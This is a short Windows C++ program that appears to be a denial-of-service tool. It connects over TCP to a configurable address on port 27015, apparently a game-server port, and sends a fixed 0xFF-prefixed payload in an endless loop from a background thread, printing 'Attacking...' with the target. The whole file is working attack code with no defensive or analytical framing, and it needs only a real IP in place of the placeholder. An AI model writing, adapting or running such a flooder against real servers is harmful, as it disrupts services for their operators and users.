#include <stdio.h>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <Windows.h>
#pragma warning(disable: 4996)

#define IP "0.0.0.0"
#define PORT 27015
#define PAYLOAD "\xFF\xFF\xFF\xFF\x85\xFF\xFF\xFF\xFF"

SOCKET sock = INVALID_SOCKET;

int main(void)
{
	WSADATA wsaData;
	if (WSAStartup(WINSOCK_VERSION, &wsaData) != NO_ERROR)
		return 1;
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
		return 2;
	sockaddr_in sa_in = { 0 };
	sa_in.sin_family = AF_INET;
	sa_in.sin_addr.S_un.S_addr = inet_addr(IP);
	sa_in.sin_port = htons(PORT);
	if (connect(sock, (SOCKADDR *)&sa_in, sizeof(sa_in)) == -1)
		return 3;
	CreateThread(NULL, 0, [](LPVOID lpParam) -> DWORD
	{
		for (;;)
			send(sock, PAYLOAD, sizeof(PAYLOAD), 0);
		return 0;
	}, NULL, 0, NULL);
	printf("Attacking...\nIP: %s\nPort: %d\n", IP, PORT);
	getchar();
	return 0;
}